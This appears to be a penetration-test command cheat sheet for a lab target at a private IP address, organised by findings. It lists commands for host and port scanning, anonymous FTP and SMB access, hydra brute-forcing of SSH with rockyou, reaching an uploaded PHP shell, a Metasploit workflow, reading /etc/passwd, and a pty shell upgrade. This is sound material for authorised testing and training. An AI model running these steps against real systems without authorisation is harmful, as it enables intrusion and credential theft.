@@ -1,0 +1,138 @@
+========================================
+PENETRATION TEST – COMMAND REFERENCE
+Target: 172.20.10.3
+Environment: Kali Linux
+========================================
+
+
+[ RECONNAISSANCE ]
+
+# Identify live hosts in network
+sudo arp-scan -l
+
+
+[ SCANNING & ENUMERATION ]
+
+# Full port scan
+nmap -p- 172.20.10.3
+
+# Service and version detection
+nmap -sV 172.20.10.3
+
+# Aggressive scan (OS + scripts)
+nmap -A 172.20.10.3
+
+
+----------------------------------------
+[ F-001: MISCONFIGURED FTP SERVICE ]
+----------------------------------------
+
+# Connect to FTP (anonymous access test)
+ftp 172.20.10.3
+
+# List files
+ls
+
+# Download file (if accessible)
+get <filename>
+
+
+----------------------------------------
+[ F-002: SMB SHARE EXPOSURE ]
+----------------------------------------
+
+# Enumerate SMB shares
+smbclient -L //172.20.10.3/
+
+# Access share
+smbclient //172.20.10.3/<share_name>
+
+# List files inside share
+ls
+
+# Download file
+get <filename>
+
+
+----------------------------------------
+[ F-003: WEAK AUTHENTICATION ]
+----------------------------------------
+
+# Brute-force credentials (example: SSH/FTP)
+hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://172.20.10.3
+
+# Login using discovered credentials
+ssh <username>@172.20.10.3
+
+
+----------------------------------------
+[ F-004: ADMIN INTERFACE EXPOSURE ]
+----------------------------------------
+
+# Access WordPress admin panel (browser)
+http://172.20.10.3:12380/wp-admin
+
+
+----------------------------------------
+[ F-005: INSECURE FILE UPLOAD (RCE) ]
+----------------------------------------
+
+# Upload malicious file via web interface
+# (performed through browser)
+
+# Access uploaded shell
+http://172.20.10.3/uploads/<shell>.php
+
+
+----------------------------------------
+[ F-006: REMOTE CODE EXECUTION ]
+----------------------------------------
+
+# Search for exploit
+searchsploit wordpress
+
+# Start Metasploit
+msfconsole
+
+# Example workflow:
+# search <exploit>
+# use <module>
+# set RHOSTS 172.20.10.3
+# set PAYLOAD <payload>
+# exploit
+
+
+----------------------------------------
+[ F-007: PRIVILEGE ESCALATION ]
+----------------------------------------
+
+# Check current user
+whoami
+
+# System info
+uname -a
+
+# Check users
+cat /etc/passwd
+
+# Check sudo permissions
+sudo -l
+
+# Upgrade shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+----------------------------------------
+[ F-008: DATABASE ACCESS ]
+----------------------------------------
+
+# Access phpMyAdmin (browser)
+http://172.20.10.3:12380/phpmyadmin
+
+
+----------------------------------------
+[ F-009: LACK OF LOGGING & MONITORING ]
+----------------------------------------
+
+# Observation-based (no alerts/logs triggered during testing)
+
